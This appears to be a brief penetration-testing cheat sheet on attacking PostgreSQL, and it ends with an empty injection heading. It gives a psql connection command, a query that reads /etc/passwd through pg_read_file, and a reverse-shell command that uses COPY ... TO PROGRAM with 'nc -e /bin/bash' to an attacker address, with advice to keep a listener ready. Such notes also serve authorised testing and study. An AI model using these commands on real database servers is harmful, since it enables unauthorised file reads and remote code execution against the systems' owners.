# PostgreSQL
PostgreSQL notes

## psql

**Connecting** 

```psql -h <ip> -U <username> -d <database>```

default databases:
- postgres

**Code Execution**

Reading files

```SELECT pg_read_file('/etc/passwd', 0, 1000);```

Popping shell

```COPY (SELECT '') TO PROGRAM 'nc -e /bin/bash <ip> <port>'```

*this will run as the postgres user*

expected output:

```COPY 1```

commands will have their output in stdout so running id, whoami here wouldn't give much value 
but they are still run, same as nc, so have a listener ready

## postgresql injection

